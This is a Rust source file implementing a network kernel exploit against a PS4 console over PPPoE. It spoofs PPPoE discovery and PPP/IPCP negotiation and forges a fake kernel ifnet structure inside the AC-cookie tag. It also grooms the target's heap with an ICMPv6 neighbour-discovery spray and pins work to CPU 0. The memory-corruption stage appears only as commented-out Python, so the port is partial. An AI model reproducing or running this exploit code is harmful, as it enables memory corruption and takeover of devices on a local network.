extern crate hwaddr;
extern crate packet;
extern crate pnet;
use crate::constants;
use packet::ether;
use packet::Builder;
use pnet::datalink::Channel::Ethernet;
use pnet::datalink::{self, DataLinkReceiver, DataLinkSender, NetworkInterface};
use pnet::packet::icmpv6::MutableIcmpv6Packet;
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::{
    ethernet::{EtherTypes, MutableEthernetPacket},
    icmpv6::{Icmpv6Code, Icmpv6Types},
    ipv6::MutableIpv6Packet,
};
use std::convert::TryInto;
use std::str::FromStr; // Add this line to bring FromStr into scope
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread::{self, JoinHandle};
use std::time;

pub struct LcpEchoHandler<'a> {
    interface: &'a NetworkInterface,
    running: Arc<AtomicBool>,
    thread_handle: Option<JoinHandle<()>>,
}

impl<'a> LcpEchoHandler<'a> {
    pub fn new(interface: &'a NetworkInterface) -> Self {
        Self {
            interface,
            running: Arc::new(AtomicBool::new(false)),
            thread_handle: None,
        }
    }

    pub fn start(&mut self) {
        println!("[*] Starting LCP Echo Handler...");
        let running = Arc::new(AtomicBool::new(true));
        self.running = Arc::clone(&running);
        let interface = self.interface.clone();

        // Open channel
        let (mut tx, mut rx) = match datalink::channel(&interface, Default::default()) {
            Ok(datalink::Channel::Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => panic!("Unhandled channel type"),
            Err(e) => panic!(
                "An error occurred when creating the datalink channel: {}",
                e
            ),
        };

        // Pass channel to the thread and run
        let running_in_thread = Arc::clone(&running);
        let handle = thread::spawn(move || {
            while running_in_thread.load(Ordering::Relaxed) {
                LcpEchoHandler::echo_handler(tx.as_mut(), rx.as_mut());
            }
            println!("Thread has stopped.");
        });

        self.thread_handle = Some(handle);
    }

    pub fn stop(&mut self) {
        // Stop the thread
        self.running.store(false, Ordering::Relaxed);
        if let Some(handle) = self.thread_handle.take() {
            handle.join().unwrap();
        }
    }

    fn echo_handler(tx: &mut dyn DataLinkSender, rx: &mut dyn DataLinkReceiver) {
        println!("[*] Starting loop for LCP Echo Request...");
        loop {
            match rx.next() {
                Ok(packet) => {
                    // If it is an LCP echo request, send a reply
                    if is_lcp_echo_request(packet) {
                        println!("[*] Found LCP Echo Request...");
                        Self::send_echo_reply(tx, packet);
                    }
                }
                Err(e) => {
                    panic!("An error occurred while reading a packet: {}", e);
                }
            }
        }
    }

    fn send_echo_reply(tx: &mut dyn DataLinkSender, request: &[u8]) {
        let source_mac: [u8; 6] = request[0..6]
            .try_into()
            .expect("Slice with incorrect length");

        let target_mac: [u8; 6] = request[6..12]
            .try_into()
            .expect("Slice with incorrect length");

        let identifier = request[23];

        let magic_number: [u8; 4] = request[26..30].try_into().expect("errpor");

        // Build the LCP reply
        let lcp_reply = create_lcp_echo_reply(
            source_mac,
            target_mac,
            constants::PPPOE_SESSION_ID.to_be_bytes(),
            identifier,
            magic_number,
        );
        // Use it to send the response
        let _result = tx
            .send_to(&lcp_reply, None)
            .expect("[-] Failed to send Echo Reply");
    }
}

pub struct Exploit {
    pub target_mac: [u8; 6],
    pub pppoe_softc: u64,
    pub source_mac: [u8; 6],
    pub host_uniq: [u8; 8],
}

impl Exploit {
    pub fn calc_planted(&mut self) {
        let planted = (self.pppoe_softc + 0x07) & 0xffffffffffff;
        let planted_bytes = planted.to_be_bytes();
        // Take the first 6 bytes of the 8-byte array and convert them to a fixed-size array
        let truncated_bytes: [u8; 6] = planted_bytes[2..8]
            .try_into()
            .expect("slice with incorrect length");
        self.source_mac = truncated_bytes;
        println!("[+] Source MAC: {:?}", self.source_mac);
    }

    pub fn ppp_negotiation(&mut self, interface: &NetworkInterface) {
        println!("[*] Starting PPP Negotiation...");
        let (mut tx, mut rx) = match datalink::channel(interface, Default::default()) {
            Ok(Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => panic!("Unhandled channel type"),
            Err(e) => panic!(
                "An error occurred when creating the datalink channel: {}",
                e
            ),
        };

        let padi = listen_for_packet(rx.as_mut(), is_padi_packet);
        self.handle_padi(&padi.unwrap());
        let pado = create_pado_packet(
            self.source_mac,
            self.target_mac,
            create_fake_ifnet(self.pppoe_softc),
            self.host_uniq,
        );
        let _result = tx
            .send_to(&pado, None)
            .expect("[-] Failed to send PADO packet");
        let _padr = listen_for_packet(rx.as_mut(), is_padr_packet);
        println!("[+] PADR Packet received");
        // Send PADS
        println!("[+] Sending PADS");
        let pads = create_pads_packet(
            self.source_mac,
            self.target_mac,
            constants::PPPOE_SESSION_ID.to_be_bytes(),
            self.host_uniq,
        );
        let _result = tx
            .send_to(&pads, None)
            .expect("[-] Failed to send PADS packet");
        println!("[+] PPP Negotiation Success!");
    }

    pub fn lcp_negotiation(&mut self, interface: &NetworkInterface) {
        //  Create LCP Configure request

        let (mut tx, mut rx) = match datalink::channel(interface, Default::default()) {
            Ok(Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => panic!("Unhandled channel type"),
            Err(e) => panic!(
                "An error occurred when creating the datalink channel: {}",
                e
            ),
        };

        println!("[*] Sending LCP configure request...");
        let lcp_configure = create_lcp_conf_request(
            self.source_mac,
            self.target_mac,
            0x00,
            constants::PPPOE_SESSION_ID.to_be_bytes(),
        );
        let _result = tx
            .send_to(&lcp_configure, None)
            .expect("[-] Failed to send lcp_configure packet");

        println!("[*] Waiting for LCP configure ACK...");
        let _result = listen_for_packet(rx.as_mut(), is_lcp_conf_ack);
        println!("[*] Waiting for LCP configure request...");
        let result = listen_for_packet(rx.as_mut(), is_lcp_conf_req);
        println!("[*] Sending LCP configure ACK..."); // FIX this need to have id of the request
        let id = u8::from_be_bytes([result.unwrap()[23]]);
        let lcp_conf_ack = create_lcp_conf_ack(
            self.source_mac,
            self.target_mac,
            0x00,
            constants::PPPOE_SESSION_ID.to_be_bytes(),
            id,
        );
        let _result = tx
            .send_to(&lcp_conf_ack, None)
            .expect("[-] Failed to send lcp_conf_ack packet");
        println!("[*] LCP Negotiation Done.");
    }

    pub fn ipcp_negotiation(&mut self, interface: &NetworkInterface) {
        let (mut tx, mut rx) = match datalink::channel(interface, Default::default()) {
            Ok(Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => panic!("Unhandled channel type"),
            Err(e) => panic!(
                "An error occurred when creating the datalink channel: {}",
                e
            ),
        };
        // Send IPCP conf request
        println!("[*] Sending IPCP configure request...");
        let lcp_configure = create_ipcp_conf_request(
            self.source_mac,
            self.target_mac,
            0x00,
            constants::PPPOE_SESSION_ID.to_be_bytes(),
            2, // TODO fix this
            constants::SOURCE_IPV4,
        );
        let _result = tx
            .send_to(&lcp_configure, None)
            .expect("[-] Failed to send IPCP configure req packet");
        // wait for Rec conf ack
        println!("[*] Waiting for IPCP configure ACK...");
        let _result = listen_for_packet(rx.as_mut(), is_ipcp_conf_ack);
        // wait for req conf
        println!("[*] Waiting for IPCP configure request...");
        let result = listen_for_packet(rx.as_mut(), is_ipcp_conf_req);
        let id = u8::from_be_bytes([result.unwrap()[23]]);
        // send nak
        println!("[*] Sending IPCP configure NAK...");
        let lcp_configure = create_ipcp_conf_nak(
            self.source_mac,
            self.target_mac,
            0x00,
            constants::PPPOE_SESSION_ID.to_be_bytes(),
            id,
            constants::TARGET_IPV4,
        );
        let _result = tx
            .send_to(&lcp_configure, None)
            .expect("[-] Failed to send IPCP configure NAK packet");
        // wait for req conf
        println!("[*] Waiting for IPCP configure request...");
        let result: Option<Vec<u8>> = listen_for_packet(rx.as_mut(), is_ipcp_conf_req);
        let id = u8::from_be_bytes([result.unwrap()[23]]);
        // send conf ack
        println!("[*] Sending IPCP configure ACK...");
        let lcp_configure = create_ipcp_conf_ack(
            self.source_mac,
            self.target_mac,
            0x00,
            constants::PPPOE_SESSION_ID.to_be_bytes(),
            id, // todo actually take it from the req
            constants::TARGET_IPV4,
            constants::FAKE_PRIMARY_DNS_SERVER,
        );
        let _result = tx
            .send_to(&lcp_configure, None)
            .expect("[-] Failed to send IPCP configure ACK packet");
        println!("[*] Finished IPCP Negotiation");
    }

    pub fn handle_padi(&mut self, data: &[u8]) {
        println!("[+] PADI packet received");
        // Extracting Host Unique Tag and populating the self.pppoe_softc
        self.host_uniq = extract_host_uniq(data).unwrap();
        self.pppoe_softc = u64::from_be_bytes(self.host_uniq);
        // Extract and update source mac
        self.target_mac = extract_ps4_source_mac(data).unwrap();
        println!("[+] Exploit Target MAC: {:?}", self.target_mac);
        self.calc_planted();
        let ac_cookie = create_fake_ifnet(self.pppoe_softc);
        println!("[+] AC cookie length: {:?}", ac_cookie.len());
    }

    pub fn heap_grooming(&mut self, interface: &NetworkInterface) {
        // Open channel
        let (mut tx, mut rx) = match datalink::channel(interface, Default::default()) {
            Ok(Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => panic!("Unhandled channel type"),
            Err(e) => panic!(
                "An error occurred when creating the datalink channel: {}",
                e
            ),
        };
        // Wait for the ICMPv6 Router Solicitation packet
        println!("[+] Waiting for Router Solicitation packet");
        let result = listen_for_packet(rx.as_mut(), is_icmpv6_router_sol);
        let target_ipv6: [u8; 16] = result.unwrap()[22..38].try_into().unwrap();
        println!("[+] Target IPv6 {:?}", target_ipv6);
        // Enters grooming loop
        spray(
            tx.as_mut(),
            rx.as_mut(),
            self.source_mac,
            self.target_mac,
            target_ipv6,
        );
        println!("[+] Heap grooming...done");
    }

    pub fn memory_corruption(&mut self, interface: &NetworkInterface) {
        // # Send invalid packet to trigger a printf in the kernel. For some
        // # reason, this causes scheduling on CPU 0 at some point, which makes
        // # the next allocation use the same per-CPU cache.
        // Open channel
        let (mut tx, mut _rx) = match datalink::channel(interface, Default::default()) {
            Ok(Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => panic!("Unhandled channel type"),
            Err(e) => panic!(
                "An error occurred when creating the datalink channel: {}",
                e
            ),
        };
        pin_to_cpu_0(tx.as_mut(), self.source_mac, self.target_mac);
        thread::sleep(time::Duration::from_secs(1));

        // Corrupt in6_llentry object
        // overflow_lle = self.build_overflow_lle()
        // print('[*] Sending malicious LCP configure request...')
        // for i in range(self.CORRUPT_NUM):
        //     self.s.send(
        //         Ether(src=self.source_mac,
        //               dst=self.target_mac,
        //               type=ETHERTYPE_PPPOE) / PPPoE(sessionid=self.SESSION_ID) /
        //         PPP() / PPP_LCP(code=CONF_REQ,
        //                         id=self.LCP_ID,
        //                         len=TARGET_SIZE + 4,
        //                         data=(PPP_LCP_Option(data=b'A' *
        //                                              (TARGET_SIZE - 4)) /
        //                               PPP_LCP_Option(data=overflow_lle))))

        // print('[*] Waiting for LCP configure reject...')
        // while True:
        //     pkt = self.s.recv()
        //     if pkt and pkt.haslayer(PPP_LCP_Configure) and pkt[
        //             PPP_LCP_Configure].code == CONF_REJ:
        //         break

        // # Re-negotiate after rejection
        // self.lcp_negotiation()
        // self.ipcp_negotiation()

        // corrupted = False
        // for i in reversed(range(self.SPRAY_NUM)):
        //     if i % 0x100 == 0:
        //         print('[*] Scanning for corrupted object...{}'.format(hex(i)),
        //               end='\r',
        //               flush=True)

        //     if i >= self.HOLE_START and i % self.HOLE_SPACE == 0:
        //         continue

        //     source_ipv6 = 'fe80::{:04x}:4141:4141:4141'.format(i)

        //     self.s.send(
        //         Ether(src=self.source_mac, dst=self.target_mac) /
        //         IPv6(src=source_ipv6, dst=self.target_ipv6) /
        //         ICMPv6EchoRequest())

        //     while True:
        //         pkt = self.s.recv()
        //         if pkt:
        //             if pkt.haslayer(ICMPv6EchoReply):
        //                 break
        //             elif pkt.haslayer(ICMPv6ND_NS):
        //                 corrupted = True
        //                 break

        //     if corrupted:
        //         break

        //     self.s.send(
        //         Ether(src=self.source_mac, dst=self.target_mac) /
        //         IPv6(src=source_ipv6, dst=self.target_ipv6) /
        //         ICMPv6ND_NA(tgt=source_ipv6, S=1) /
        //         ICMPv6NDOptDstLLAddr(lladdr=self.source_mac))

        // if not corrupted:
        //     print('[-] Scanning for corrupted object...failed. Please retry.')
        //     exit(1)

        // print(
        //     '[+] Scanning for corrupted object...found {}'.format(source_ipv6))
    }
}

fn pin_to_cpu_0(tx: &mut dyn DataLinkSender, source_mac: [u8; 6], target_mac: [u8; 6]) {
    for i in 0..constants::PIN_NUM {
        println!("[+] Pinning to CPU 0...{:?}%", 100 * i / constants::PIN_NUM);
        // Create etherpacket
        let packet = ether::Builder::default()
            .source(source_mac.into())
            .unwrap()
            .destination(target_mac.into())
            .unwrap()
            .protocol(ether::Protocol::PppoeSession)
            .unwrap()
            .build()
            .unwrap();
        // Send the request
        let _result = tx
            .send_to(packet.as_slice(), None)
            .expect("[-] Failed to send etherpacket");
        thread::sleep(time::Duration::from_millis(1));
        println!("[+] Pinning to CPU 0...done")
    }
}

fn is_ipcp_conf_req(data: &[u8]) -> bool {
    // Check if packet length is sufficient for PPP header
    if data.len() < 14 + 6 {
        return false;
    }

    // PPP IPCP
    // Check Ethernet type field (0xc021)
    let ethertype = u16::from_be_bytes([data[20], data[21]]);
    if ethertype != constants::ETHERTYPE_IPCP {
        return false;
    }

    // PPP IPCP config ack
    let code = u8::from_be_bytes([data[22]]);
    code == constants::IPCP_CONF_REQ
}
fn is_ipcp_conf_ack(data: &[u8]) -> bool {
    // Check if packet length is sufficient for PPP header
    if data.len() < 14 + 6 {
        return false;
    }

    // PPP IPCP
    // Check Ethernet type field (0xc021)
    let ethertype = u16::from_be_bytes([data[20], data[21]]);
    if ethertype != constants::ETHERTYPE_IPCP {
        return false;
    }

    // PPP IPCP config ack
    let code = u8::from_be_bytes([data[22]]);
    code == constants::IPCP_CONF_ACK
}

fn is_lcp_conf_ack(data: &[u8]) -> bool {
    // Check if packet length is sufficient for PPP header
    if data.len() < 14 + 6 {
        return false;
    }

    // PPP LCP
    // Check Ethernet type field (0xc021)
    let ethertype = u16::from_be_bytes([data[20], data[21]]);
    if ethertype != constants::ETHERTYPE_LCP {
        return false;
    }

    // PPP LCP config request
    let code = u8::from_be_bytes([data[22]]);
    code == constants::LCP_CONF_ACK
}

fn is_lcp_conf_req(data: &[u8]) -> bool {
    // Check if packet length is sufficient for PPP header
    if data.len() < 14 + 6 {
        return false;
    }

    // PPP LCP
    // Check Ethernet type field (0xc021)
    let ethertype = u16::from_be_bytes([data[20], data[21]]);
    if ethertype != constants::ETHERTYPE_LCP {
        return false;
    }

    // PPP LCP config request
    let code = u8::from_be_bytes([data[22]]);
    code == constants::LCP_CONF_REQ
}

fn is_padi_packet(data: &[u8]) -> bool {
    // Check if packet length is sufficient for PPPoE Discovery header
    if data.len() < 14 + 6 {
        return false;
    }

    // Check Ethernet type field for PPPoE Discovery (0x8863)
    let ethertype = u16::from_be_bytes([data[12], data[13]]);
    if ethertype != constants::ETHERTYPE_PPPOEDISC {
        return false;
    }

    // Check PPPoE code field for PADI (0x09)
    let pppoe_code = u8::from_be_bytes([data[15]]);
    pppoe_code == constants::PPPOE_CODE_PADI
}

fn is_padr_packet(data: &[u8]) -> bool {
    // Check if packet length is sufficient for PPPoE Discovery header
    if data.len() < 14 + 6 {
        return false;
    }

    // Check Ethernet type field for PPPoE Discovery (0x8863)
    let ethertype = u16::from_be_bytes([data[12], data[13]]);
    if ethertype != constants::ETHERTYPE_PPPOEDISC {
        return false;
    }

    // Check PPPoE code field for PADR
    let pppoe_code = u8::from_be_bytes([data[15]]);
    pppoe_code == constants::PPPOE_CODE_PADR
}

fn is_icmpv6_router_sol(data: &[u8]) -> bool {
    // Check if packet length is sufficient for IPv6
    if data.len() < 14 + 40 {
        println!("[+] Wrong size: {:?}", data);
        return false;
    }

    // Check Ethernet type field
    let ethertype = u16::from_be_bytes([data[12], data[13]]);
    if ethertype != constants::ETHERTYPE_IPV6 {
        println!("[+] Wrong ethertype: {:?}", data);
        return false;
    }

    // Check code field for Router sol
    let ipv6_code = u8::from_be_bytes([data[54]]);
    let result = ipv6_code == constants::IPCPV6_RS;
    println!("[+] Correct router code?: {:?}", result);
    result
}

fn is_lcp_echo_request(data: &[u8]) -> bool {
    // Check if packet length is sufficient for LCP echo request
    // 6 + 6 + 2 + 4 = PPP for sure
    if data.len() < 14 + 6 {
        return false;
    }

    // Check Ethernet type field for LCP (0xc021)
    let ethertype = u16::from_be_bytes([data[12], data[13]]);
    if ethertype != constants::ETHERTYPE_PPPOESESS {
        return false;
    }

    // Check PPPoE code field
    let pppoe_code = u8::from_be_bytes([data[22]]);
    pppoe_code == constants::PPPOE_CODE_LCP_ECHO_REQ
}

fn extract_host_uniq(data: &[u8]) -> Result<[u8; 8], Box<dyn std::error::Error>> {
    let mut result = [0u8; 8];
    // Go to the tags
    let mut offset = constants::ETH_HEADER_LEN + constants::PPPOE_HEADER_LEN;
    // Read all the tags until possible
    while offset + constants::PPPOE_TAG_HEADER_LEN <= data.len() {
        // Read Header
        let tag_type = u16::from_be_bytes([data[offset], data[offset + 1]]);
        let tag_len = u16::from_be_bytes([data[offset + 2], data[offset + 3]]) as usize;
        offset += constants::PPPOE_TAG_HEADER_LEN;
        if tag_type == constants::PPPOE_TAG_HOST_UNIQ && offset + tag_len <= data.len() {
            // Extract the Host-Uniq tag value
            let host_uniq = &data[offset..offset + tag_len];
            if tag_len == 8 {
                // If Host-Uniq is expected to be a 64-bit integer, interpret it as Big-Endian
                result.copy_from_slice(host_uniq);
                println!("[+] Extracted Host-Uniq: {:?}", result);
                break;
            }
        }
        // Go to next tag
        offset += tag_len;
    }
    Ok(result)
}

fn extract_ps4_source_mac(data: &[u8]) -> Result<[u8; 6], Box<dyn std::error::Error>> {
    // Extract the source MAC address
    let offset = constants::ETH_SOURCE_MAC;
    let mac_bytes = &data[offset..offset + 6];

    // Create a 6-byte array and copy the data into it
    let mut mac_address = [0u8; 6];
    mac_address.copy_from_slice(mac_bytes);

    Ok(mac_address)
}

pub fn create_fake_ifnet(pppoe_softc: u64) -> Vec<u8> {
    // Fake ifnet
    let mut fake_ifnet = vec![0x41; 0x48]; // Fill with 'A' initially
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // if_addrhead
    fake_ifnet.resize(0x70, 0x41); // Fill to 0x70 with 'A'
    fake_ifnet.extend(&0x0001u16.to_le_bytes()); // if_index
    fake_ifnet.resize(0xa0, 0x41); // Fill to 0xa0 with 'A'
    fake_ifnet.push(constants::IFT_ETHER); // ifi_type
    fake_ifnet.push(0); // ifi_physical
    fake_ifnet.push(0x8 + 0x1); // ifi_addrlen
    fake_ifnet.resize(0x1b8, 0x41); // Fill to 0x1b8 with 'A'

    fake_ifnet.extend(&(pppoe_softc + constants::PPPOE_SOFTC_SC_DEST).to_le_bytes()); // if_addr
    fake_ifnet.resize(0x428, 0x41); // Fill to 0x428 with 'A'
    fake_ifnet.extend(&(pppoe_softc + 0x10 - 0x8).to_le_bytes()); // nd_ifinfo
                                                                  // if_afdata_lock

    fake_ifnet.resize(0x480, 0x41); // Fill to 0x480 with 'A'
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_name
    fake_ifnet.extend(&constants::RW_INIT_FLAGS.to_le_bytes()); // lo_flags
    fake_ifnet.extend(&0u32.to_le_bytes()); // lo_data
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_witness
    fake_ifnet.extend(&constants::RW_UNLOCKED.to_le_bytes()); // rw_lock
                                                              // if_addr_mtx

    fake_ifnet.resize(0x4c0, 0x41); // Fill to 0x4c0 with 'A'

    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_name
    fake_ifnet.extend(&constants::MTX_INIT_FLAGS.to_le_bytes()); // lo_flags
    fake_ifnet.extend(&0u32.to_le_bytes()); // lo_data
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_witness
    fake_ifnet.extend(&constants::MTX_UNOWNED.to_le_bytes()); // mtx_lock
    fake_ifnet
}

fn spray(
    tx: &mut dyn DataLinkSender,
    rx: &mut dyn DataLinkReceiver,
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    target_v6: [u8; 16],
) {
    for i in 0..constants::SPRAY_NUM {
        println!("[+] Heap Grooming at {:?}%", 100 * i / constants::SPRAY_NUM);
        let source_v6_string = format!("fe80::{:04x}:4141:4141:4141", i);
        let source_v6: [u8; 16] = std::net::Ipv6Addr::from_str(&source_v6_string)
            .expect("Failed to parse IPv6 address")
            .octets();
        let icmpv6_req = create_icmpv6_echo_req(source_mac, target_mac, source_v6, target_v6);

        // Send the request
        let _result = tx
            .send_to(icmpv6_req.as_slice(), None)
            .expect("[-] Failed to send icmpv6");
        //  Wait for response for each req
        let _result = listen_for_packet(rx, is_icmpv6_nd_ns);
        if i >= constants::HOLE_START && i % constants::HOLE_SPACE == 0 {
            println!("[-]HOLE");
            continue;
        }
        //  Sends advertisment only to certain response to create hole in the target heap

        let icmpv6_adv = create_icmpv6_adv(source_mac, target_mac, source_v6, target_v6);

        // Send the request
        let _result = tx
            .send_to(icmpv6_adv.as_slice(), None)
            .expect("[-] Failed to send icmpv6adv");
        let _result = listen_for_packet(rx, is_icmpv6_echo_reply);
    }
}

fn is_icmpv6_nd_ns(data: &[u8]) -> bool {
    // Check if packet length is sufficient
    if data.len() < 14 + 6 {
        return false;
    }
    // Check Ethernet type field (0x86dd)
    let ethertype = u16::from_be_bytes([data[12], data[13]]);
    if ethertype != 0x86dd {
        return false;
    }

    let ip_header = data[20];
    if ip_header != 0x3a {
        return false;
    }
    let code = data[54];
    code == 135
}

fn is_icmpv6_echo_reply(data: &[u8]) -> bool {
    // Check if packet length is sufficient
    if data.len() < 14 + 6 {
        return false; // Minimum length check
    }

    // Check Ethernet type field (0x86dd)
    let ethertype = u16::from_be_bytes([data[12], data[13]]);
    if ethertype != 0x86dd {
        return false; // Only IPv6 packets
    }

    // Check if the next header is ICMPv6
    let ip_header = data[20]; // Assuming IPv6 header starts at index 20
    if ip_header != 0x3a {
        return false; // 0x3a corresponds to ICMPv6
    }

    // Check ICMPv6 type and code for Echo Reply (type: 129, code: 0)
    let icmpv6_type = data[54]; // ICMPv6 type field
    let icmpv6_code = data[55]; // ICMPv6 code field
    icmpv6_type == 129 && icmpv6_code == 0 // Echo Reply type and code
}

pub fn create_ipcp_conf_ack(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    session_data: u8,
    session_id: [u8; 2],
    ipcp_identifier: u8,
    ip_address: [u8; 4],
    dns: [u8; 4],
) -> Vec<u8> {
    let mut payload = Vec::new();

    // PPPoE header
    payload.push(0x11); // Version (1) and Type (1)
    payload.push(session_data);
    payload.extend_from_slice(&session_id);

    // Fixed length
    payload.extend_from_slice(&[0, 24]);

    // PPP header
    payload.extend_from_slice(&constants::ETHERTYPE_IPCP.to_be_bytes());

    // IPCP and fixed length
    payload.push(constants::IPCP_CONF_ACK); // Configuration ACK
    payload.push(ipcp_identifier); //Identifier used to match req and rep
    payload.extend_from_slice(&[0, 22]);

    // IP
    payload.push(constants::IP_ADDRESS_TYPE); // Configuration Request
                                              // Fixed length
    payload.push(0x6);
    payload.extend_from_slice(&ip_address);

    //DNS1
    payload.push(0x81);
    payload.push(0x6);
    payload.extend_from_slice(&dns);

    //DNS2
    payload.push(0x83);
    payload.push(0x6);
    payload.extend_from_slice(&dns);

    ether::Builder::default()
        .source(source_mac.into())
        .unwrap()
        .destination(target_mac.into())
        .unwrap()
        .protocol(ether::Protocol::PppoeSession)
        .unwrap()
        .payload(&payload)
        .unwrap()
        .build()
        .unwrap()
}

pub fn create_ipcp_conf_nak(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    session_data: u8,
    session_id: [u8; 2],
    ipcp_identifier: u8,
    ip_address: [u8; 4],
) -> Vec<u8> {
    let mut payload = Vec::new();

    // PPPoE header
    payload.push(0x11); // Version (1) and Type (1)
    payload.push(session_data);
    payload.extend_from_slice(&session_id);

    // Fixed length
    payload.extend_from_slice(&[0, 12]);

    // PPP header
    payload.extend_from_slice(&constants::ETHERTYPE_IPCP.to_be_bytes());

    // IPCP and fixed length
    payload.push(constants::IPCP_CONF_NAK); // Configuration NAK
    payload.push(ipcp_identifier);
    payload.extend_from_slice(&[0, 10]);

    // IP
    payload.push(constants::IP_ADDRESS_TYPE); // Configuration Request
                                              // Fixed length
    payload.push(0x6);
    payload.extend_from_slice(&ip_address);

    ether::Builder::default()
        .source(source_mac.into())
        .unwrap()
        .destination(target_mac.into())
        .unwrap()
        .protocol(ether::Protocol::PppoeSession)
        .unwrap()
        .payload(&payload)
        .unwrap()
        .build()
        .unwrap()
}

pub fn create_ipcp_conf_request(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    session_data: u8,
    session_id: [u8; 2],
    ipcp_identifier: u8,
    ip_address: [u8; 4],
) -> Vec<u8> {
    let mut payload = Vec::new();

    // PPPoE header
    payload.push(0x11); // Version (1) and Type (1)
    payload.push(session_data);
    payload.extend_from_slice(&session_id);

    // Fixed length
    payload.extend_from_slice(&[0, 12]);

    // PPP header
    payload.extend_from_slice(&constants::ETHERTYPE_IPCP.to_be_bytes());

    // IPCP and fixed length
    payload.push(constants::IPCP_CONF_REQ); // Configuration Request
    payload.push(ipcp_identifier);
    payload.extend_from_slice(&[0, 10]);

    // IP
    payload.push(constants::IP_ADDRESS_TYPE); // Configuration Request
                                              // Fixed length
    payload.push(0x6);
    payload.extend_from_slice(&ip_address);

    ether::Builder::default()
        .source(source_mac.into())
        .unwrap()
        .destination(target_mac.into())
        .unwrap()
        .protocol(ether::Protocol::PppoeSession)
        .unwrap()
        .payload(&payload)
        .unwrap()
        .build()
        .unwrap()
}

pub fn create_lcp_echo_reply(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    session_id: [u8; 2],
    identifier: u8,
    magic_number: [u8; 4],
) -> Vec<u8> {
    let mut packet = Vec::new();

    // Ethernet header
    packet.extend_from_slice(&target_mac);
    packet.extend_from_slice(&source_mac);
    packet.extend_from_slice(&constants::ETHERTYPE_PPPOESESS.to_be_bytes());

    // PPPoE header
    let version_type = 0x11; // Version 1, Type 1
    let code = 0x00; // PPPoE Session
    let session_id = u16::from_be_bytes(session_id);
    packet.push(version_type);
    packet.push(code);
    packet.extend_from_slice(&session_id.to_be_bytes());

    // Fixed PPP payload length (6 bytes)
    let fixed_payload_length = 10_u16.to_be_bytes();
    packet.extend_from_slice(&fixed_payload_length);

    // PPP header
    packet.extend_from_slice(&constants::ETHERTYPE_LCP.to_be_bytes());

    // LCP Echo Reply
    let lcp_code = 0x0A; // Echo Reply
    packet.push(lcp_code);
    packet.push(identifier);

    // LCP packet length field (4 bytes: code, identifier, length field itself)
    let lcp_length = 8_u16.to_be_bytes();
    packet.extend_from_slice(&lcp_length);

    // Magic Number
    packet.extend_from_slice(&magic_number);

    packet
}

pub fn create_pado_packet(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    ac_cookie: Vec<u8>,
    host_uniq: [u8; 8],
) -> Vec<u8> {
    let mut payload = Vec::new();
    // PPPoE header
    payload.push(0x11); // Version (1) and Type (1)
    payload.push(constants::PPPOE_CODE_PADO); // Code (PADO)
    payload.extend_from_slice(&0u16.to_be_bytes()); // Session ID (not used in PADO)

    // Placeholder for Payload Length (2 bytes), will be set later
    let payload_length_pos = payload.len();
    payload.extend_from_slice(&[0, 0]);

    // PPPoE Tag for ACOOKIE
    payload.extend_from_slice(&constants::PPPOE_TAG_ACOOKIE.to_be_bytes());
    payload.extend_from_slice(&(ac_cookie.len() as u16).to_be_bytes());
    payload.extend_from_slice(&ac_cookie);

    // PPPoE Tag for HUNIQUE
    payload.extend_from_slice(&constants::PPPOE_TAG_HOST_UNIQ.to_be_bytes());
    payload.extend_from_slice(&(host_uniq.len() as u16).to_be_bytes());
    payload.extend_from_slice(&host_uniq);

    // Set the Payload Length
    let payload_length = payload.len() - payload_length_pos - 2;
    payload[payload_length_pos..payload_length_pos + 2]
        .copy_from_slice(&(payload_length as u16).to_be_bytes());

    ether::Builder::default()
        .source(source_mac.into())
        .unwrap()
        .destination(target_mac.into())
        .unwrap()
        .protocol(ether::Protocol::PppoeDiscovery)
        .unwrap()
        .payload(&payload)
        .unwrap()
        .build()
        .unwrap()
}

pub fn create_lcp_conf_ack(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    session_data: u8,
    session_id: [u8; 2],
    identifier: u8,
) -> Vec<u8> {
    let mut payload = Vec::new();
    // PPPoE header
    payload.push(0x11); // Version (1) and Type (1)
    payload.push(session_data);
    payload.extend_from_slice(&session_id);

    // Fixed length
    payload.extend_from_slice(&[0, 6]);

    // PPP header
    payload.extend_from_slice(&constants::ETHERTYPE_LCP.to_be_bytes());

    // LCP and fixed length
    payload.push(constants::LCP_CONF_ACK); // Configuration Ack
    payload.push(identifier);
    payload.extend_from_slice(&[0, 4]);

    ether::Builder::default()
        .source(source_mac.into())
        .unwrap()
        .destination(target_mac.into())
        .unwrap()
        .protocol(constants::ETHERTYPE_PPPOESESS.into())
        .unwrap()
        .payload(&payload)
        .unwrap()
        .build()
        .unwrap()
}

pub fn create_lcp_conf_request(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    session_data: u8,
    session_id: [u8; 2],
) -> Vec<u8> {
    let mut payload = Vec::new();

    // PPPoE header
    payload.push(0x11); // Version (1) and Type (1)
    payload.push(session_data);
    payload.extend_from_slice(&session_id);

    // Fixed length
    payload.extend_from_slice(&[0, 6]);

    // PPP header
    payload.extend_from_slice(&constants::ETHERTYPE_LCP.to_be_bytes());

    // LCP and fixed length
    payload.push(constants::LCP_CONF_REQ); // Configuration Request
    payload.push(constants::LCP_ID);
    payload.extend_from_slice(&[0, 4]);

    ether::Builder::default()
        .source(source_mac.into())
        .unwrap()
        .destination(target_mac.into())
        .unwrap()
        .protocol(constants::ETHERTYPE_PPPOESESS.into())
        .unwrap()
        .payload(&payload)
        .unwrap()
        .build()
        .unwrap()
}

